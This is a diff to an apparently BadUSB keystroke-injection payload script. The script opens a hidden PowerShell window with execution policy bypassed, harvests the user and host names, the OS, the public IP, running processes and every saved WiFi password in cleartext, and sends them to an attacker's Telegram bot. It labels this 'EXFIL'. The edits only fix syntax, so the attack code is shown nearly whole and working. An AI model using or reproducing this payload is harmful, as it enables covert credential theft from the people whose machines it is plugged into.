@@ -22,7 +22,8 @@ REM ============================================================
 DELAY #BOOT_DELAY
 GUI r
 DELAY 600
-STRING powershell -W Hidden -NoP -NonI -Exec Bypass -c "
+STRINGLN_POWERSHELL
+powershell -W Hidden -NoP -NonI -Exec Bypass -c "
 $b='#BOT_TOKEN';
 $c='#CHAT_ID';
 function tl($m){try{Invoke-RestMethod -Uri ('https://api.telegram.org/bot'+$b+'/sendMessage?chat_id='+$c+'&text='+[uri]::EscapeDataString($m))-Method Get}catch{}};
@@ -30,7 +31,7 @@ function tf($p){try{$n=Split-Path $p -Leaf;$u='https://api.telegram.org/bot'+$b+
 tl('=== EXFIL START ===');
 tl('User: '+$env:USERNAME+'@'+$env:COMPUTERNAME+' | OS: '+(Get-WmiObject Win32_OperatingSystem).Caption);
 tl('--- WiFi ---');
-netsh wlan show profiles|sls 'All User Profile'|%{$s=$_.ToString()-replace'.*:\s+','';$k=netsh wlan show profile name=`\"$s`\" key=clear|sls 'Key Content';$p=if($k){$k.ToString()-replace'.*:\s+',''}else{'(no pass)'};tl($s+' | '+$p)};
+netsh wlan show profiles|sls 'All User Profile'|%{$s=$_.ToString()-replace'.*:\s+','';$k=netsh wlan show profile name=\`"$s\`" key=clear|sls 'Key Content';$p=if($k){$k.ToString()-replace'.*:\s+',''}else{'(no pass)'};tl($s+' | '+$p)};
 tl('--- IP ---');
 tl((Invoke-RestMethod ifconfig.me -ErrorAction SilentlyContinue));
 tl('--- Processes Top 10 ---');
@@ -47,4 +48,4 @@ Remove-Item $sp;
 tl('=== EXFIL COMPLETE ===');
 Start-Sleep 1
 "
-ENTER
+END_STRINGLN
